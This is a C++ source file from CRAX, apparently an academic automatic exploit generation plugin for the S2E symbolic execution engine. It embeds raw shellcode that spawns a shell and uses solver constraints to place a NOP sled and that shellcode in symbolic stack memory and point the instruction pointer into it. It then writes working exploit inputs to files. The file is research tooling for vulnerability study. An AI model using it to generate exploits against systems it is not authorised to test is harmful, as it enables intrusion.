// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Expr/ConstraintBuilder.h>

#include <cassert>
#include <memory>

#include "Ret2stack.h"

using namespace klee;

namespace s2e::plugins::crax {

// http://shell-storm.org/shellcode/files/shellcode-806.php
// TODO: Allow users to specify custom shellcode via config.
std::string
Ret2stack::s_shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7"
                         "\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

Ret2stack::Ret2stack() : Technique() {
    // Generate exploit scripts that start the target process with ASLR disabled.
    g_crax->getExploit().getProcess().setAslrEnabled(false);
}


std::vector<RopPayload> Ret2stack::getRopPayloadList() const {
    S2EExecutionState *state = g_crax->getCurrentState();

    std::map<uint64_t, uint64_t> symbolicMemoryMap = mem().getSymbolicMemory();
    ref<Expr> mainExploitConstraint = nullptr;

    // Analyze the symbolic blocks in reverse order because this gives
    // higher chance of success.
    for (auto it = symbolicMemoryMap.rbegin(); it != symbolicMemoryMap.rend(); it++) {
        ref<Expr> exploitConstraint = analyzeSymbolicBlock(*state, it->first, it->second);

        if (!mainExploitConstraint && !exploitConstraint->isZero()) {
            mainExploitConstraint = exploitConstraint;
        }
    }

    // Use the first generated exploit constraint to generate an exploit script.
    // The remaining exploit constraints are generated as data (exploit-*.bin).
    if (mainExploitConstraint) {
        bool ok = state->addConstraint(mainExploitConstraint, true);
        assert(ok);

        // We need to make the ROP payload list non-empty so that an exploit script
        // will be generated. This will leave RBP unconstrained, which is fine.
        return {{ nullptr }};
    }

    // The ROP payload list is empty, so no exploit scripts will be generated.
    return {};
}

ref<Expr> Ret2stack::analyzeSymbolicBlock(S2EExecutionState &state,
                                          uint64_t symBlockBase,
                                          uint64_t symBlockSize) const {
    ref<Expr> falseExpr = ConstantExpr::create(false, Expr::Bool);

    // This symbolic memory block is not large enough to inject shellcode.
    if (symBlockSize < s_shellcode.size()) {
        return falseExpr;
    }

    log<INFO>()
        << "Analyzing symbolic block @" << hexval(symBlockBase)
        << ", size = " << hexval(symBlockSize) << '\n';

    ConstraintBuilder cb;
    ref<Expr> exploitConstraint = nullptr;
    uint64_t shellcodeAddr = symBlockBase + symBlockSize - s_shellcode.size();

    while (shellcodeAddr >= symBlockBase) {
        // Use binary search to find the longest NOP sled.
        uint64_t l = symBlockBase;
        uint64_t r = symBlockBase + symBlockSize - 1;
        bool isTrue = false;

        while (!isOverlapped(l, r)) {
            uint64_t m = l + (r - l) / 2;

            cb.clear();
            cb.And(injectShellcodeAt(shellcodeAddr));
            cb.And(injectNopSledBetween(m, shellcodeAddr - 1));
            cb.And(setRipBetween(m, shellcodeAddr));
            exploitConstraint = cb.build();

            state.solver()->mayBeTrue(Query(state.constraints(), exploitConstraint), isTrue);

            if (isTrue) {
                r = m;
            } else {
                l = m;
            }
        }

        if (isTrue) {
            std::string filename = format("exploit-%llx.bin", symBlockBase);
            generateExploit(state, exploitConstraint, filename);
            return exploitConstraint;
        }

        shellcodeAddr--;
    }

    log<WARN>()
        << "Could not generate any exploit for: "
        << hexval(symBlockBase) << '\n';

    return falseExpr;
}


ref<Expr> Ret2stack::injectShellcodeAt(uint64_t addr) const {
    ConstraintBuilder cb;

    for (size_t i = 0; i < s_shellcode.size(); i++) {
        ref<Expr> target = mem().readSymbolic(addr + i, Expr::Int8);
        ref<Expr> value = ConstantExpr::create((uint8_t) s_shellcode[i], Expr::Int8);
        cb.And(EqExpr::create(target, value));
    }

    return cb.build();
}

ref<Expr> Ret2stack::injectNopSledBetween(uint64_t lowerbound,
                                          uint64_t upperbound) const {
    ConstraintBuilder cb;

    for (size_t i = lowerbound; i <= upperbound; i++) {
        ref<Expr> target = mem().readSymbolic(i, Expr::Int8);
        ref<Expr> value = ConstantExpr::create((uint8_t) 0x90, Expr::Int8);
        cb.And(EqExpr::create(target, value));
    }

    return cb.build();
}

ref<Expr> Ret2stack::setRipBetween(uint64_t lowerbound,
                                   uint64_t upperbound) const {
    constexpr uint64_t ripBits = 48;

    ref<Expr> rip = reg().readSymbolic(Register::X64::RIP, ripBits);
    ref<Expr> ripLowerbound = ConstantExpr::create(lowerbound, ripBits);
    ref<Expr> ripUpperbound = ConstantExpr::create(upperbound, ripBits);

    return AndExpr::create(UgeExpr::create(rip, ripLowerbound),
                           UleExpr::create(rip, ripUpperbound));
}

void Ret2stack::generateExploit(S2EExecutionState &state,
                                const ref<Expr> &constraints,
                                std::string filename) const {
    // Clone a new state to avoid directly modifying the original state.
    std::unique_ptr<S2EExecutionState> clonedState(
            static_cast<S2EExecutionState *>(state.clone()));

    clonedState->concolics = Assignment::create(state.concolics);

    // Add the given (exploit) constraints to the cloned state.
    bool ok = clonedState->addConstraint(constraints, true);
    assert(ok);

    // Query the solver for an exploit.
    std::vector<uint8_t> bytes = RopPayloadBuilder::getOneConcreteInput(*clonedState);

    // Write the exploit (data) to the file.
    g_crax->getExploitGenerator().generateExploit(bytes, filename);
}

}  // namespace s2e::plugins::crax
